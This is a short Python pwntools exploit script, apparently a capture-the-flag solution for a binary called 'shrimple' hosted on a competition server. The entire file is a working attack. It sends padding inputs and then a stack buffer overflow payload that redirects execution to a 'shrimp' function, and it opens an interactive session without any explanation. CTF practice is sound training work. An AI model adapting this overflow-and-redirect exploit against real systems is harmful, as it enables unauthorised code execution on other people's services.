from pwn import *

exe = ELF("./shrimple")

# p = process("./shrimple")
p = remote("chal.competitivecyber.club", 8884)

p.recvuntil(b">> ")
p.sendline(b"A"*42)
p.recvuntil(b">> ")
p.sendline(b"B"*41)

p.recvuntil(b">> ")
p.sendline(b"C"*38 + p64(exe.sym["shrimp"]+5))

p.interactive()